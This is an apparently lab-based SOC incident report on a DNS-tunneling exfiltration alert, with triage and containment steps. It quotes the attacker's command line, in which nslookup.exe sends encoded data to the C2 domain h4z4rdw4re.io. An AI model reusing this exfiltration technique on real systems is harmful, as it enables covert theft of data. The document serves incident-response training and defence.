# Alert 1026 Case Report -  Active Data Exfiltration via DNS Tunneling (nslookup.exe Payload Chunk)

## 1. Summary
* **Classification:** True Positive
* **Severity:** Critical
* **Escalation Required:** Yes
* **Timestamp:** `09/07/2026 18:09:34.240`
* **Summary:** A Critical True Positive incident was identified on host `win-3450` (belonging to Michael Ascot) involving an additional DNS exfiltration chunk. The compromised PowerShell process (PID: 3728) spawned `nslookup.exe` (PID: 3952) from the staged exfiltration directory, transmitting base64/hex-encoded data payload chunks (`5AAAAbAAAAQ2xpZW50UG9ydGZvbGlv...`) to the C2 domain `h4z4rdw4re.io`.

---

## 2. Affected Entities & Host Details
* **Source Host:** `win-3450`
* **User Account:** `michael.ascot` (Michael Ascot)
* **Target C2 Domain:** `5AAAAbAAAAQ2xpZW50UG9ydGZvbGlv.h4z4rdw4re.io`

---

## 3. Indicators & Process Artifacts
* **Parent Process:** `powershell.exe` (PID: 3728)
* **Child Process:** `nslookup.exe` (PID: 3952)
* **Working Directory:** `C:\Users\michael.ascot\downloads\exfiltration`
* **Command Line:** `"C:\Windows\system32\nslookup.exe" 5AAAAbAAAAQ2xpZW50UG9ydGZvbGlv.h4z4rdw4re.io`
* **Event Code:** Sysmon Event ID 1 (Process Create)
* **Threat Activity:** Covert Data Exfiltration & C2 Tunneling (MITRE ATT&CK T1071.004, T1048.003, T1132.001)
* **Malicious Indicators:** High-entropy, encoded sublabel payload string (`5AAAAbAAAAQ2xpZW50UG9ydGZvbGlv`) passed as a target argument to `nslookup.exe` for DNS-based exfiltration.

---

## 4. Triage & Analysis

**True Positive Justification:**
Sysmon Event ID 1 (Process Creation) logs confirm `powershell.exe` (PID: 3728) spawned `nslookup.exe` (PID: 3952) executing out of the staging folder (`C:\Users\michael.ascot\downloads\exfiltration`). The specific query string contains a distinct structured payload chunk (`5AAAAbAAAAQ2xpZW50UG9ydGZvbGlv`), demonstrating active automated DNS tunneling to exfiltrate packaged corporate data under the guise of routine DNS lookups.

**Escalation Justification:**
Critical escalation is required. This activity represents ongoing, active data exfiltration following the local collection phase. DNS tunneling circumvents standard web filters by utilizing port 53 traffic, confirming an active compromise on `win-3450` that requires immediate host containment and DNS sinkholing to halt data loss.

---

## 5. Resolution & Actions
1. **Immediate Host Isolation:** Network-isolate host `win-3450` immediately to stop outbound DNS tunneling traffic.
2. **Process Termination:** Forcefully terminate parent process `powershell.exe` (PID: 3728) and child process `nslookup.exe` (PID: 3952).
3. **DNS Infrastructure Blocking:** Add `h4z4rdw4re.io` and all associated wildcard subdomains (`*.h4z4rdw4re.io`) to global DNS sinkholes, enterprise firewall blocklists, and perimeter security controls.
4. **Credential Remediation:** Invalidate all active session tokens and force a domain password reset for account `michael.ascot`.
5. **Data Loss Quantifications:** Perform a comprehensive audit of internal DNS resolver logs for all query patterns matching `*.h4z4rdw4re.io` to reassemble payload chunks and calculate the exact volume of exfiltrated data.

## 6. Screenshots
<img width="2559" height="1389" alt="ALT-1026-Log" src="https://github.com/user-attachments/assets/42884b25-e7ab-4d85-896d-a90440e5798e" />
<img width="2560" height="1392" alt="ALT-1026" src="https://github.com/user-attachments/assets/953ffd0c-ef3f-4c81-983f-077781e94360" />
